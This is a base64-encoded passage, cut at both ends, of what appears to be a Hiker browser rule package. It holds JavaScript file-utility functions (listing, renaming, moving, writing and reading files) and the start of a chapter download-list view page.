HBhdGgpO1xcXFxuICAgIGxldCBsYXN0TW9kaWZpZWQgPSBmaWxlLmxhc3RNb2RpZmllZCgpO1xcXFxuICAgIGxldCBkYXRlID0gbmV3IERhdGUobGFzdE1vZGlmaWVkKTtcXFxcbiAgICByZXR1cm4gZGF0ZS5nZXRUaW1lKCk7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGdldE5hbWUocGF0aCkge1xcXFxuICAgIHJldHVybiBuZXcgRmlsZShwYXRoKS5nZXROYW1lKCkgKyBcXFxcXFxcIlxcXFxcXFwiO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBnZXRGaWxlUGF0aChwYXRoLCB0eXBlLCBleHBhbmQpIHtcXFxcbiAgICB0eXBlID0gdHlwZSB8fCBcXFxcXFxcImZpbGVcXFxcXFxcIjtcXFxcbiAgICBpZiAoIVtcXFxcXFxcImZpbGVcXFxcXFxcIiwgXFxcXFxcXCJkaXJcXFxcXFxcIl0uaW5jbHVkZXModHlwZSkpIHRocm93IG5ldyBFcnJvcihcXFxcXFxcIuexu+Wei+mUmeivr1xcXFxcXFwiKTtcXFxcbiAgICBsZXQgZmlsZVR5cGUgPSB0eXBlID09PSBcXFxcXFxcImZpbGVcXFxcXFxcIiA/IFxcXFxcXFwiaXNGaWxlXFxcXFxcXCIgOiBcXFxcXFxcImlzRGlyZWN0b3J5XFxcXFxcXCI7XFxcXG4gICAgbGV0IGZpbGUgPSBuZXcgRmlsZShwYXRoKTtcXFxcbiAgICBsZXQgYXJyYXkgPSBmaWxlLmxpc3RGaWxlcygpIHx8IFtdO1xcXFxuICAgIGxldCBwYXRoTGlzdCA9IFtdO1xcXFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyYXkubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgaWYgKGFycmF5W2ldW2ZpbGVUeXBlXSgpKSB7XFxcXG4gICAgICAgICAgICBwYXRoTGlzdC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICBuYW1lOiBhcnJheVtpXS5nZXROYW1lKCkgKyBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIHBhdGg6IGFycmF5W2ldLmdldFBhdGgoKSArIFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgbGFzdE1vZGlmaWVkOiBOdW1iZXIoYXJyYXlbaV0ubGFzdE1vZGlmaWVkKCkpLFxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgaWYgKGV4cGFuZCkge1xcXFxuICAgICAgICBwYXRoTGlzdCA9IHBhdGhMaXN0LmZpbHRlcihpdCA9PiBpdC5uYW1lLmVuZHNXaXRoKGV4cGFuZCkpO1xcXFxuICAgIH1cXFxcbiAgICByZXR1cm4gcGF0aExpc3Q7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGdldEZpbGVzKHBhdGgsIHR5cGUsIGV4cGFuZCkge1xcXFxuICAgIGxldCB0eXBlcyA9IHtcXFxcbiAgICAgICAgXFxcXFxcXCJmaWxlXFxcXFxcXCI6IFxcXFxcXFwiaXNGaWxlXFxcXFxcXCIsXFxcXG4gICAgICAgIFxcXFxcXFwiZGlyXFxcXFxcXCI6IFxcXFxcXFwiaXNEaXJlY3RvcnlcXFxcXFxcIlxcXFxuICAgIH07XFxcXG4gICAgbGV0IGZpbGVUeXBlID0gdHlwZXNbdHlwZV07XFxcXG4gICAgbGV0IGZpbGUgPSBuZXcgRmlsZShwYXRoKTtcXFxcbiAgICBsZXQgYXJyYXkgPSBmaWxlLmxpc3RGaWxlcygpIHx8IFtdO1xcXFxuICAgIGxldCBmaWxlTGlzdCA9IFtdO1xcXFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyYXkubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgbGV0IGZpbGUgPSBhcnJheVtpXTtcXFxcbiAgICAgICAgaWYgKCghZmlsZVR5cGUgfHwgZmlsZVtmaWxlVHlwZV0oKSkgJiYgKCFleHBhbmQgfHwgZmlsZS5nZXROYW1lKCkuZW5kc1dpdGgoZXhwYW5kKSkpIHtcXFxcbiAgICAgICAgICAgIGZpbGVMaXN0LnB1c2goZmlsZSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIGZpbGVMaXN0O1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiByZW5hbWVGaWxlKGZyb21QYXRoLCBuYW1lKSB7XFxcXG4gICAgbGV0IGZyb21GaWxlID0gbmV3IEZpbGUoZnJvbVBhdGgpO1xcXFxuICAgIGxldCB0b0ZpbGUgPSBuZXcgRmlsZShmcm9tRmlsZS5nZXRQYXJlbnQoKSArIFxcXFxcXFwiL1xcXFxcXFwiICsgbmFtZSk7XFxcXG4gICAgdHJ5IHtcXFxcbiAgICAgICAgaWYgKCFmcm9tRmlsZS5leGlzdHMoKSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGlmICh0b0ZpbGUuZXhpc3RzKCkpIHtcXFxcbiAgICAgICAgICAgIGlmICghdG9GaWxlLmRlbGV0ZSgpKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIEZpbGVzLm1vdmUoZnJvbUZpbGUudG9QYXRoKCksIHRvRmlsZS50b1BhdGgoKSwgU3RhbmRhcmRDb3B5T3B0aW9uLlJFUExBQ0VfRVhJU1RJTkcpO1xcXFxuICAgICAgICByZXR1cm4gdHJ1ZTtcXFxcbiAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxcXG4gICAgfVxcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBtb3ZlRmlsZXMoZnJvbVBhdGgsIHRvUGF0aCkge1xcXFxuICAgIGxldCBmcm9tRmlsZSA9IG5ldyBGaWxlKGZyb21QYXRoKTtcXFxcbiAgICBsZXQgdG9GaWxlID0gbmV3IEZpbGUodG9QYXRoKTtcXFxcbiAgICB0cnkge1xcXFxuICAgICAgICBpZiAoIWZyb21GaWxlLmV4aXN0cygpKSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYgKHRvRmlsZS5leGlzdHMoKSkge1xcXFxuICAgICAgICAgICAgaWYgKCFkZWxldGVGaWxlcyh0b1BhdGgpKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIEZpbGVzLm1vdmUoZnJvbUZpbGUudG9QYXRoKCksIHRvRmlsZS50b1BhdGgoKSwgU3RhbmRhcmRDb3B5T3B0aW9uLlJFUExBQ0VfRVhJU1RJTkcpO1xcXFxuICAgICAgICByZXR1cm4gdHJ1ZTtcXFxcbiAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxcXG4gICAgfVxcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBmaWxlV3JpdGUocGF0aCwgY29udGVudCkge1xcXFxuICAgIHdyaXRlRmlsZShcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIHBhdGgsIGNvbnRlbnQpXFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGZpbGVXcml0ZUFwcGVuZChwYXRoLCBjb250ZW50KSB7XFxcXG4gICAgbGV0IGZpbGUgPSBuZXcgRmlsZShwYXRoKTtcXFxcbiAgICBsZXQgcGF0aHMgPSBmaWxlLnRvUGF0aCgpO1xcXFxuICAgIGlmIChmaWxlLmV4aXN0cygpKSB7XFxcXG4gICAgICAgIEZpbGVzLndyaXRlKHBhdGhzLCBuZXcgamF2YVN0cmluZyhjb250ZW50KS5nZXRCeXRlcygpLCBTdGFuZGFyZE9wZW5PcHRpb24uQVBQRU5EKTtcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgICB3cml0ZUZpbGUoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBwYXRoLCBjb250ZW50KTtcXFxcbiAgICB9XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGdldFRvdGFsU2l6ZU9mRmlsZXNJbkRpcihmaWxlKSB7XFxcXG4gICAgaWYgKGZpbGUuaXNGaWxlKCkpIHtcXFxcbiAgICAgICAgcmV0dXJuIGZpbGUubGVuZ3RoKCk7XFxcXG4gICAgfVxcXFxuICAgIGxldCBjaGlsZHJlbiA9IGZpbGUubGlzdEZpbGVzKCk7XFxcXG4gICAgbGV0IHRvdGFsID0gMDtcXFxcbiAgICBpZiAoY2hpbGRyZW4gIT0gbnVsbCkge1xcXFxuICAgICAgICBmb3IgKGxldCBjaGlsZCBvZiBjaGlsZHJlbikge1xcXFxuICAgICAgICAgICAgdG90YWwgKz0gZ2V0VG90YWxTaXplT2ZGaWxlc0luRGlyKGNoaWxkKTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH1cXFxcbiAgICByZXR1cm4gdG90YWw7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGdldEZpbGVTaXplKGZpbGVQYXRoKSB7XFxcXG4gICAgLy9CeXRlXFxcXG4gICAgbGV0IHNpemUgPSBnZXRUb3RhbFNpemVPZkZpbGVzSW5EaXIobmV3IEZpbGUoZmlsZVBhdGgpKTtcXFxcbiAgICBpZiAoc2l6ZSA8IDApIHtcXFxcbiAgICAgICAgcmV0dXJuIG51bGw7XFxcXG4gICAgfVxcXFxuICAgIGxldCB1bml0Rm9ybSA9IFtcXFxcXFxcIkJ5dGVcXFxcXFxcIiwgXFxcXFxcXCJLQlxcXFxcXFwiLCBcXFxcXFxcIk1CXFxcXFxcXCIsIFxcXFxcXFwiR0JcXFxcXFxcIiwgXFxcXFxcXCJUQlxcXFxcXFwiXTtcXFxcbiAgICBmb3IgKGxldCBpID0gMCwgbGVuID0gdW5pdEZvcm0ubGVuZ3RoOyBpIDwgbGVuOyBpKyspIHtcXFxcbiAgICAgICAgaWYgKHNpemUgPiAxMDI0KSB7XFxcXG4gICAgICAgICAgICBzaXplIC89IDEwMjQ7XFxcXG4gICAgICAgICAgICBjb250aW51ZTtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBzaXplLnRvRml4ZWQoMikucmVwbGFjZSgvKFxcXFxcXFxcLjAwKSQvLCBcXFxcXFxcIlxcXFxcXFwiKSArIHVuaXRGb3JtW2ldO1xcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxuICAgIHJldHVybiBcXFxcXFxcIkVSUk9SOuaVsOWAvOi/h+Wkp1xcXFxcXFwiO1xcXFxufVxcXFxuLy/lrozmlbTlkIjlubZcXFxcbi8qXFxcXG5mdW5jdGlvbiBmaWxlQ29tYmluZShmaWxlc0lucHV0LCBmaWxlT3V0LCBleHRlbnNpb24sIGludGVyY2VwdCkge1xcXFxuICAgIHdpdGgoamF2YVNjb3BlKSB7XFxcXG4gICAgICAgIGNvbnN0IFRNUF9CVUZGRVJfU0laRSA9IDB4MzAwMDA7XFxcXG4gICAgICAgIGNvbnN0IEJVRkZFUl9TSVpFID0gMHgzMDAwMDA7XFxcXG4gICAgICAgIC8v5ZCI5bm25Li05pe25paH5Lu2XFxcXG4gICAgICAgIGxldCBpbnB1dEZpbGUgPSBuZXcgRmlsZShmaWxlc0lucHV0KTtcXFxcbiAgICAgICAgbGV0IHRtcEZpbGUgPSBuZXcgRmlsZShmaWxlT3V0ICsgXFxcXFxcXCIudG1wXFxcXFxcXCIpO1xcXFxuICAgICAgICBsZXQgdG9zID0gbmV3IEJ1ZmZlcmVkT3V0cHV0U3RyZWFtKG5ldyBGaWxlT3V0cHV0U3RyZWFtKHRtcEZpbGUpKTtcXFxcbiAgICAgICAgbGV0IGlucHV0RmlsZXMgPSBpbnB1dEZpbGUubGlzdEZpbGVzKCk7XFxcXG4gICAgICAgIGxldCB0YnlzID0gQXJyYXkubmV3SW5zdGFuY2UoQnl0ZS5UWVBFLCBUTVBfQlVGRkVSX1NJWkUpO1xcXFxuICAgICAgICBmb3IgKGxldCBmaWxlIG9mIGlucHV0RmlsZXMpIHtcXFxcbiAgICAgICAgICAgIGlmIChmaWxlLmdldE5hbWUoKS5lbmRzV2l0aChleHRlbnNpb24pKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGlzID0gbmV3IEZpbGVJbnB1dFN0cmVhbShmaWxlKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgbGVuID0gMDtcXFxcbiAgICAgICAgICAgICAgICB3aGlsZSAoKGxlbiA9IGlzLnJlYWQodGJ5cykpICE9IC0xKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRvcy53cml0ZSh0YnlzLCAwLCBsZW4pO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBpcy5jbG9zZSgpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHRvcy5jbG9zZSgpO1xcXFxuICAgICAgICAvL+inhOWImeabv+aNouinhOWImTtcXFxcbiAgICAgICAgbGV0IG91dEZpbGUgPSBuZXcgRmlsZShmaWxlT3V0KTtcXFxcbiAgICAgICAgaWYgKHR5cGVvZiBpbnRlcmNlcHQgPT09IFxcXFxcXFwiZnVuY3Rpb25cXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgbGV0IHRpcyA9IG5ldyBGaWxlSW5wdXRTdHJlYW0odG1wRmlsZSk7XFxcXG4gICAgICAgICAgICBsZXQgb3MgPSBuZXcgQnVmZmVyZWRPdXRwdXRTdHJlYW0obmV3IEZpbGVPdXRwdXRTdHJlYW0ob3V0RmlsZSkpO1xcXFxuICAgICAgICAgICAgbGV0IGxlbiA9IDA7XFxcXG4gICAgICAgICAgICBsZXQgYnlzID0gQXJyYXkubmV3SW5zdGFuY2UoQnl0ZS5UWVBFLCBCVUZGRVJfU0laRSk7XFxcXG4gICAgICAgICAgICB3aGlsZSAoKGxlbiA9IHRpcy5yZWFkKGJ5cykpICE9IC0xKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IG5ieXMgPSBpbnRlcmNlcHQobmV3IFN0cmluZyhieXMsMCxsZW4pKTtcXFxcbiAgICAgICAgICAgICAgICBvcy53cml0ZShuYnlzLCAwLCBuYnlzLmxlbmd0aCk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB0bXBGaWxlLmRlbGV0ZSgpO1xcXFxuICAgICAgICAgICAgdGlzLmNsb3NlKCk7XFxcXG4gICAgICAgICAgICBvcy5jbG9zZSgpO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgaWYgKG91dEZpbGUuZXhpc3RzKCkpIHtcXFxcbiAgICAgICAgICAgICAgICBvdXRGaWxlLmRlbGV0ZSgpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgdG1wRmlsZS5yZW5hbWVUbyhvdXRGaWxlKTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH1cXFxcbn0qL1xcXFxuLy/mrotcXFxcbmZ1bmN0aW9uIGZpbGVSdWxlKGZpbGVzSW5wdXQsIGZpbGVPdXQsIGludGVyY2VwdCkge1xcXFxuICAgIHdpdGgoamF2YVNjb3BlKSB7XFxcXG4gICAgICAgIGNvbnN0IEJVRkZFUl9TSVpFID0gMHgzMDAwMDA7XFxcXG4gICAgICAgIGxldCB0bXBGaWxlID0gbmV3IEZpbGUoZmlsZXNJbnB1dCk7XFxcXG4gICAgICAgIGlmICghKHRtcEZpbGUuZXhpc3RzKCkgJiYgdG1wRmlsZS5pc0ZpbGUoKSkpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBmYWxzZTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBsZXQgb3V0RmlsZSA9IG5ldyBGaWxlKGZpbGVPdXQpO1xcXFxuXFxcXG4gICAgICAgIGxldCB0aXMgPSBuZXcgRmlsZUlucHV0U3RyZWFtKHRtcEZpbGUpO1xcXFxuICAgICAgICBsZXQgb3MgPSBuZXcgQnVmZmVyZWRPdXRwdXRTdHJlYW0obmV3IEZpbGVPdXRwdXRTdHJlYW0ob3V0RmlsZSkpO1xcXFxuICAgICAgICBsZXQgbGVuID0gMDtcXFxcbiAgICAgICAgbGV0IGJ5cyA9IEFycmF5Lm5ld0luc3RhbmNlKEJ5dGUuVFlQRSwgQlVGRkVSX1NJWkUpO1xcXFxuICAgICAgICB3aGlsZSAoKGxlbiA9IHRpcy5yZWFkKGJ5cykpICE9IC0xKSB7XFxcXG4gICAgICAgICAgICBsZXQgbmJ5cyA9IGludGVyY2VwdChuZXcgU3RyaW5nKGJ5cywgMCwgbGVuKSk7XFxcXG4gICAgICAgICAgICBvcy53cml0ZShuYnlzLCAwLCBuYnlzLmxlbmd0aCk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgdG1wRmlsZS5kZWxldGUoKTtcXFxcbiAgICAgICAgdGlzLmNsb3NlKCk7XFxcXG4gICAgICAgIG9zLmNsb3NlKCk7XFxcXG4gICAgICAgIHJldHVybiB0cnVlO1xcXFxuICAgIH1cXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gcmVhZEZpbGUocGF0aCkge1xcXFxuICAgIHRyeSB7XFxcXG4gICAgICAgIGxldCBwYXRocyA9IFBhdGhzLmdldChwYXRoKTtcXFxcbiAgICAgICAgaWYgKCFGaWxlcy5leGlzdHMocGF0aHMpKSByZXR1cm4gXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICAgICAgcmV0dXJuIFN0cmluZyhuZXcgamF2YVN0cmluZyhGaWxlcy5yZWFkQWxsQnl0ZXMocGF0aHMpKSk7XFxcXG4gICAgfSBjYXRjaCB7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgIH1cXFxcbn1cXFxcbiQuZXhwb3J0cyA9IHtcXFxcbiAgICBnZXRGaWxlVGltZTogKHBhdGgpID0+IGdldEZpbGVUaW1lKHBhdGgpLFxcXFxuICAgIGdldEZpbGVQYXRoOiAocGF0aCwgdHlwZSwgZXhwYW5kKSA9PiBnZXRGaWxlUGF0aChwYXRoLCB0eXBlLCBleHBhbmQpLFxcXFxuICAgIGRlbGV0ZUZpbGVzOiAocGF0aCkgPT4gZGVsZXRlRmlsZXMocGF0aCksXFxcXG4gICAgcmVuYW1lRmlsZTogKHBhdGgsIG5hbWUpID0+IHJlbmFtZUZpbGUocGF0aCwgbmFtZSksXFxcXG4gICAgbW92ZUZpbGVzOiAoZnJvbVBhdGgsIHRvUGF0aCkgPT4gbW92ZUZpbGVzKGZyb21QYXRoLCB0b1BhdGgpLFxcXFxuICAgIGZpbGVXcml0ZTogKHBhdGgsIGNvbnRlbnQpID0+IGZpbGVXcml0ZShwYXRoLCBjb250ZW50KSxcXFxcbiAgICBmaWxlV3JpdGVBcHBlbmQ6IChwYXRoLCBjb250ZW50KSA9PiBmaWxlV3JpdGVBcHBlbmQocGF0aCwgY29udGVudCksXFxcXG4gICAgZ2V0TmFtZTogKHBhdGgpID0+IGdldE5hbWUocGF0aCksXFxcXG4gICAgZ2V0RmlsZVNpemU6IChmaWxlUGF0aCkgPT4gZ2V0RmlsZVNpemUoZmlsZVBhdGgpLFxcXFxuICAgIGZpbGVSdWxlOiAoZmlsZXNJbnB1dCwgZmlsZU91dCwgaW50ZXJjZXB0KSA9PiBmaWxlUnVsZShmaWxlc0lucHV0LCBmaWxlT3V0LCBpbnRlcmNlcHQpLFxcXFxuICAgIGNvcHlGaWxlOiAoc291cmNlLCB0YXJnZXQsIGlzQ292ZXIpID0+IGNvcHlGaWxlKHNvdXJjZSwgdGFyZ2V0LCBpc0NvdmVyKSxcXFxcbiAgICByZWFkRmlsZTogKHBhdGgpID0+IHJlYWRGaWxlKHBhdGgpLFxcXFxuICAgIGdldEZpbGVzOiAocGF0aCwgdHlwZSwgZXhwYW5kKSA9PiBnZXRGaWxlcyhwYXRoLCB0eXBlLCBleHBhbmQpLFxcXFxuICAgIGdldFRvdGFsU2l6ZU9mRmlsZXNJbkRpcjooZmlsZSk9PmdldFRvdGFsU2l6ZU9mRmlsZXNJbkRpcihmaWxlKVxcXFxufVxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJ0ZXh0XzJcXFwiLFxcXCJuYW1lXFxcIjpcXFwiI3Yu5LiL6L295YiX6KGoLeaZrumAmuS4i+i9vVxcXCIsXFxcInBhdGhcXFwiOlxcXCJkb3dubG9hZC52aWV3XFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuY29uc3Qgdmlld0NvbmZpZyA9IE9iamVjdC5hc3NpZ24oe1xcXFxuICAgIGNoYXB0ZXJMaXN0OiBbXSxcXFxcbiAgICBpbmZvOiB7fSxcXFxcbiAgICBkZWZhdWx0VmlldzogXFxcXFxcXCIwXFxcXFxcXCJcXFxcbn0sIE1ZX1BBUkFNUyk7XFxcXG52aWV3Q29uZmlnLmluZm8gPSBPYmplY3QuYXNzaWduKHtcXFxcbiAgICBydWxlTmFtZTogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICBib29rTmFtZTogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICBib29rVG9wUGljOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgIHBhcnNlQ29kZTogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICBkZWNvZGU6IHVuZGVmaW5lZCxcXFxcbiAgICB0eXBlOiBcXFxcXFxcImNvbWljXFxcXFxcXCIsXFxcXG4gICAgY29taWNTY2hlbWU6IFxcXFxcXFwiMVxcXFxcXFwiLFxcXFxuICAgIGJvb2tJZDpcXFxcXFxcIlxcXFxcXFwiLFxcXFxufSwgdmlld0NvbmZpZy5pbmZvKTtcXFxcbmxldCB7XFxcXG4gICAgY2hhcHRlckxpc3QsXFxcXG4gICAgaW5mbyxcXFxcbiAgICBkZWZhdWx0Vmlld1xcXFxufSA9IHZpZXdDb25maWc7XFxcXG5zZXRQYWdlVGl0bGUoXFxcXFxcXCLpgInmi6nlmah8XFxcXFxcXCIgKyBpbmZvLmJvb2tOYW1lKVxcXFxuXFxcXG5jb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFxcXFxcIik7XFxcXG5jb25zdCBUb29sID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL1Rvb2wuanNcXFxcXFxcIik7XFxcXG5jb25zdCBDb25maWcgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcXFxcXCIpO1xcXFxuXFxcXG52aWV3Q29uZmlnLmluZm8uYm9va05hbWUgPSBUb29sLnRleHRTaGllbGQodmlld0NvbmZpZy5pbmZvLmJvb2tOYW1lKTtcXFxcbnZpZXdDb25maWcuaW5mby5ydWxlTmFtZSA9IFRvb2wudGV4dFNoaWVsZCh2aWV3Q29uZmlnLmluZm8ucnVsZU5hbWUpO1xcXFxuXFxcXG5jb25zdCBNWV9JRCA9IGluZm8ucnVsZU5hbWUgKyBcXFxcXFxcIi8vXFxcXFxcXCIgKyBpbmZvLmJvb2tOYW1lK1xcXFxcXFwiLy9cXFxcXFxcIitpbmZvLmJvb2tJZDtcXFxcbmxldCBib2lkPWluZm8uYm9va0lkP1xcXFxcXFwiJFxcXFxcXFwiK2luZm8uYm9va0lkOlxcXFxcXFwiXFxcXFxcXCI7XFxcXG5jb25zdCBjcGF0aD1cXFxcXFxcIi9cXFxcXFxcIiArIGluZm8ucnVsZU5hbWUgKyBcXFxcXFxcIi9cXFxcXFxcIiArIGluZm8uYm9va05hbWUrYm9pZDtcXFxcbmxldCBpc1N0YXJ0ID0gZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjppc1N0YXJ0XFxcXFxcXCIpO1xcXFxubGV0IHZpZXdNb2RlID0gZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjp2aWV3TW9kZVxcXFxcXFwiLCBkZWZhdWx0Vmlldyk7XFxcXG5sZXQgaXNSZXZlcnNlID0gZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjppc1JldmVyc2VcXFxcXFxcIiwgXFxcXFxcXCIwXFxcXFxcXCIpO1xcXFxubGV0IHRhZ0ZpbHRlciA9IGdldE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6dGFnRmlsdGVyXFxcXFxcXCIsIENvbmZpZy5kZWZfRG9WaV9UeXBlKTtcXFxcblxcXFxuYWRkTGlzdGVuZXIoXFxcXFxcXCJvbkNsb3NlXFxcXFxcXCIsICQudG9TdHJpbmcoKE1ZX0lEKSA9PiB7XFxcXG4gICAgY2xlYXJNeVZhcihNWV9JRCArIFxcXFxcXFwiOmxvYWRpbmdUZWFtXFxcXFxcXCIpO1xcXFxuICAgIGNsZWFyTXlWYXIoTVlfSUQgKyBcXFxcXFxcIjp2aWV3TW9kZVxcXFxcXFwiKTtcXFxcbiAgICBjbGVhck15VmFyKE1ZX0lEICsgXFxcXFxcXCI6Y29tcGxldGVkXFxcXFxcXCIpO1xcXFxuICAgIGNsZWFyTXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpiYXRjaFRlYW1cXFxcXFxcIik7XFxcXG4gICAgY2xlYXJNeVZhcihNWV9JRCArIFxcXFxcXFwiOnRhZ0ZpbHRlclxcXFxcXFwiKTtcXFxcbiAgICBjbGVhck15VmFyKE1ZX0lEICsgXFxcXFxcXCI6cGFnZU51bVxcXFxcXFwiKTtcXFxcbn0sIE1ZX0lEKSk7XFxcXG5cXFxcbmxldCBsYXlvdXQgPSBbXTtcXFxcblxcXFxuaWYgKGlzU3RhcnQgPT09IFxcXFxcXFwiMVxcXFxcXFwiKSB7XFxcXG4gICAgcHV0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjp2aWV3TW9kZVxcXFxcXFwiLCBkZWZhdWx0Vmlldyk7XFxcXG4gICAgdmlld01vZGUgPSBcXFxcXFxcIjFcXFxcXFxcIjtcXFxcbn1cXFxcblxcXFxubGV0IGJhY2t1cENoYXB0ZXJMaXN0ID0gY2hhcHRlckxpc3Q7XFxcXG5pZiAodHlwZW9mIGNoYXB0ZXJMaXN0ID09PSBcXFxcXFxcInN0cmluZ1xcXFxcXFwiKSB7XFxcXG4gICAgaWYgKGNoYXB0ZXJMaXN0LnN0YXJ0c1dpdGgoXFxcXFxcXCJoaWtlcjovL2ZpbGVzL1xcXFxcXFwiKSkge1xcXFxuICAgICAgICBjaGFwdGVyTGlzdCA9IGdldFBhdGgoY2hhcHRlckxpc3QpLnNsaWNlKDcpO1xcXFxuICAgICAgICBiYWNrdXBDaGFwdGVyTGlzdCA9IGNoYXB0ZXJMaXN0O1xcXFxuICAgIH1cXFxcbiAgICBjaGFwdGVyTGlzdCA9IEpTT04ucGFyc2UocmVxdWVzdChcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIGNoYXB0ZXJMaXN0KSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxufVxcXFxubGV0IGNoYXB0ZXJBbGwgPSBjaGFwdGVyTGlzdDtcXFxcbmNoYXB0ZXJMaXN0ID0gY2hhcHRlckxpc3QubWFwKChpdGVtLCBDSUQpID0+IHtcXFxcbiAgICBpdGVtLkNJRCA9IENJRDtcXFxcbiAgICBpdGVtLnRpdGxlID0gVG9vbC50ZXh0U2hpZWxkKGl0ZW0udGl0bGUpO1xcXFxuICAgIHJldHVybiBpdGVtO1xcXFxufSk7XFxcXG5sZXQgcGFnZU51bSA9IE51bWJlcihnZXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOnBhZ2VOdW1cXFxcXFxcIiwgXFxcXFxcXCIxXFxcXFxcXCIpKTtcXFxcbmxldCBjaGFwdGVyQ2h1bmsgPSBbY2hhcHRlckxpc3RdLmNvbmNhdChUb29sLmNodW5rKGNoYXB0ZXJMaXN0LCBDb25maWcudmlld1BhZ2VTaXplKSk7XFxcXG5jaGFwdGVyTGlzdCA9IGNoYXB0ZXJDaHVua1twYWdlTnVtXSB8fCBbXTtcXFxcbmNvbnN0IGRlZl9Eb1ZpX1N0eWxlID0gY2hhcHRlckFsbC5sZW5ndGggPT09IDEgPyBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIiA6IENvbmZpZy5kZWZfRG9WaV9TdHlsZTtcXFxcblxcXFxuZnVuY3Rpb24gc2V0VHlwZSgpIHtcXFxcbiAgICBsZXQgc2V0ID0gKHRhZywgcHV0KSA9PiB7XFxcXG4gICAgICAgIHB1dE15VmFyKHB1dCwgdGFnKTtcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICB9O1xcXFxuICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IDAgPT0gcGFnZU51bSA/IFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyAoXFxcXFxcXCLlhajpg6goXFxcXFxcXCI